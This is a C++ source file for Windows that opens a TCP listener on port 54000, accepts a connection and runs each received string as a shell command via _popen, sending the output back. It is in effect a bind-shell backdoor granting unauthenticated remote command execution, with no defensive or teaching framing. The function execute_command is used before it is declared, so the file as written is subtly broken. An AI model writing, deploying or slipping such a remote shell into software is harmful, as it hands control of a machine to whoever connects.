#include <iostream>
#include <string>
#include <WS2tcpip.h>
#include <winsock2.h>
#include <windows.h>
#include <vector>
#include <fstream>

#pragma comment (lib, "ws2_32.lib")

int main() {
    // Initialize Winsock
    WSADATA wsData;
    WORD ver = MAKEWORD(2, 2);
    int wsResult = WSAStartup(ver, &wsData);
    if (wsResult != 0) {
        std::cerr << "Can't start Winsock, Err #" << wsResult << std::endl;
        return 1;
    }

    // Create a socket
    SOCKET listening = socket(AF_INET, SOCK_STREAM, 0);
    if (listening == INVALID_SOCKET) {
        std::cerr << "Can't create socket, Err #" << WSAGetLastError() << std::endl;
        WSACleanup();
        return 1;
    }

    // Bind the socket to an IP address and port
    sockaddr_in hint;
    hint.sin_family = AF_INET;
    hint.sin_port = htons(54000);  // Choose a port
    hint.sin_addr.S_un.S_addr = INADDR_ANY;  // Listen on all available network interfaces

    bind(listening, (sockaddr*)&hint, sizeof(hint));

    // Tell Winsock the socket is for listening
    listen(listening, SOMAXCONN);

    // Wait for a connection
    sockaddr_in client;
    int clientSize = sizeof(client);

    SOCKET clientSocket = accept(listening, (sockaddr*)&client, &clientSize);

    char host[NI_MAXHOST];  // Client's remote name
    char service[NI_MAXSERV];  // Service (i.e., port) the client is connected on

    ZeroMemory(host, NI_MAXHOST);
    ZeroMemory(service, NI_MAXSERV);

    if (getnameinfo((sockaddr*)&client, sizeof(client), host, NI_MAXHOST, service, NI_MAXSERV, 0) == 0) {
        std::cout << host << " connected on port " << service << std::endl;
    } else {
        inet_ntop(AF_INET, &client.sin_addr, host, NI_MAXHOST);
        std::cout << host << " connected on port " << ntohs(client.sin_port) << std::endl;
    }

    // Close listening socket
    closesocket(listening);

    // While loop: accept and execute commands from the client
    char buf[4096];
    while (true) {
        ZeroMemory(buf, 4096);

        // Wait for client to send data
        int bytesReceived = recv(clientSocket, buf, 4096, 0);
        if (bytesReceived == SOCKET_ERROR) {
            std::cerr << "Error in recv(). Quitting" << std::endl;
            break;
        }

        if (bytesReceived == 0) {
            std::cout << "Client disconnected" << std::endl;
            break;
        }

        // Execute the received command and capture the output
        std::string command(buf, bytesReceived);
        std::string output = execute_command(command);

        // Send the command output back to the client
        send(clientSocket, output.c_str(), output.size() + 1, 0);
    }

    // Close the client socket
    closesocket(clientSocket);

    // Cleanup Winsock
    WSACleanup();

    return 0;
}

std::string execute_command(const std::string& command) {
    // Execute the received command using popen
    FILE* pipe = _popen(command.c_str(), "r");
    if (!pipe) {
        return "Error executing command.";
    }

    std::string result;
    char buffer[128];
    while (!feof(pipe)) {
        if (fgets(buffer, 128, pipe) != NULL) {
            result += buffer;
        }
    }

    _pclose(pipe);
    return result;
}
